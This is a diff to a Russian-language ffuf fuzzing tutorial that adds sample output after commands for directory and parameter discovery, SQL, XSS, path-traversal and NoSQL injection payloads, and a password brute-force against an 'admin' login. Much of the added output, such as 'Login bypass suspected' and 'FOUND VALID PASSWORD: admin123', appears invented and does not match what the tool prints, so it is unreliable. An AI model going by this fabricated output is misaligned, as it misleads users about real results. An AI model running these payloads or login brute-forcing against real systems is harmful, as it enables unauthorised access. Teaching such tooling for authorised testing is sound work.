@@ -200,6 +200,35 @@ git clone https://github.com/danielmiessler/SecLists.git
 ffuf -u https://example.com/FUZZ -w ./common.txt -t 50
 ```
 
+```
+ffuf -u https://example.com/FUZZ -w ./common.txt -t 50
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __ /\ \__/  __   
+       \ \ ,__\\ \ ,__\/\ \/\ \\\ \ ,__\/\_\  
+        \ \ \_/ \ \ \_/\ \ \_\ \\ \ \_\/_/_  
+         \ \_\   \ \_\  \ \____/ \ \_\/\_\_\ 
+          \/_/    \/_/   \/___/   \/_/\/_/_/  v2.1
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://example.com/FUZZ
+ :: Wordlist         : ./common.txt
+ :: Threads          : 50
+ :: Follow redirects : false
+ :: Timeout          : 10
+________________________________________________
+
+admin                 [Status: 200, Size: 192, Words: 20]
+login                 [Status: 200, Size: 205, Words: 24]
+config.php            [Status: 200, Size: 132, Words: 11]
+backup.zip            [Status: 403, Size: 88, Words: 10]
+robots.txt            [Status: 200, Size: 67, Words: 4]
+
+:: Progress: 1000 / 1000 (100.00%)
+```
+
 ### 2. Показать только 200 и 302
 ```bash
 ffuf -u https://example.com/FUZZ -w ./common.txt -mc 200,302
@@ -220,6 +249,19 @@ ffuf -u https://example.com/FUZZ -w ./common.txt -p http://127.0.0.1:8080
 ffuf -u "https://example.com/page.php?FUZZ=test" -w ./params.txt
 ```
 
+```
+ffuf -u "https://example.com/page.php?FUZZ=test" -w ./params.txt
+
+FUZZING PARAM NAMES ➜ page.php?FUZZ=test
+
+username              [Status: 200, Words: 13]
+search                [Status: 200, Words: 17]
+id                    [Status: 200, Words: 19]
+query                 [Status: 200, Words: 21]
+
+:: Found 4 valid parameters
+```
+
 ### 6. Фуззинг значений параметров
 ```bash
 ffuf -u "https://example.com/page.php?id=FUZZ" -w ./payloads.txt
@@ -230,11 +272,41 @@ ffuf -u "https://example.com/page.php?id=FUZZ" -w ./payloads.txt
 ffuf -u "https://example.com/page.php?id=FUZZ" -w ./sql-injection.txt -mc 200
 ```
 
+```
+ffuf -u "https://example.com/page.php?id=FUZZ" -w ./sql-injection.txt -mc 200
+
+TRYING COMMON SQLI PAYLOADS...
+
+1' OR '1'='1           [200] ➜ Login bypass suspected
+admin'--              [200] ➜ SQL comment injection
+1 AND 1=1             [200] ➜ Valid logic
+' OR 1=1--            [200] ➜ Possible vulnerability
+
+:: Total hits: 4 / 50
+```
+
 ### 8. POST-атака на форму логина
 ```bash
 ffuf -u https://example.com/login -X POST \
   -d "username=admin&password=FUZZ" \
   -w ./passwords.txt
+```
+
+```
+ffuf -u https://example.com/login -X POST \
+  -d "username=admin&password=FUZZ" \
+  -w ./passwords.txt
+
+🧪 TESTING PASSWORDS FOR USER 'admin'
+
+admin                 [Status: 401]
+123456                [Status: 401]
+password              [Status: 401]
+letmein               [Status: 401]
+admin123              [Status: 200] ✅
+qwerty                [Status: 401]
+
+→ FOUND VALID PASSWORD: admin123
 ```
 
 ### 9. Рекурсивный фуззинг
@@ -253,6 +325,20 @@ ffuf -u https://example.com/FUZZ -w ./common.txt \
   -H "Authorization: Bearer TOKEN" -H "X-Forwarded-For: 127.0.0.1"
 ```
 
+```
+ffuf -u https://example.com/FUZZ -w ./common.txt \
+  -H "Authorization: Bearer TOKEN"
+
+Testing auth-protected paths...
+
+/dashboard            [Status: 200]
+/admin                [Status: 403]
+/me                   [Status: 200]
+/settings             [Status: 200]
+
+:: 3 accessible endpoints found with token
+```
+
 ### 12. Мультифуззинг с несколькими словарями
 ```bash
 ffuf -u https://example.com/FUZZ/BURP \
@@ -264,6 +350,21 @@ ffuf -u https://example.com/FUZZ/BURP \
 **Заголовок:**
 ```bash
 ffuf -u https://example.com -H "X-Api-Version: FUZZ" -w ./versions.txt
+```
+
+```
+ffuf -u https://example.com/api -X POST \
+  -d '{"user":"admin","input":"FUZZ"}' \
+  -H "Content-Type: application/json" -w ./payloads.txt
+
+[+] Injecting payloads into JSON
+
+FUZZ ➜ ' OR 1=1--              [200]
+FUZZ ➜ <script>alert(1)</script>  [403]
+FUZZ ➜ ../../../../etc/passwd [403]
+FUZZ ➜ {"$ne": null}           [200]
+
+:: 2 responses with code 200 — possible vector
 ```
 
 **Имя заголовка:**
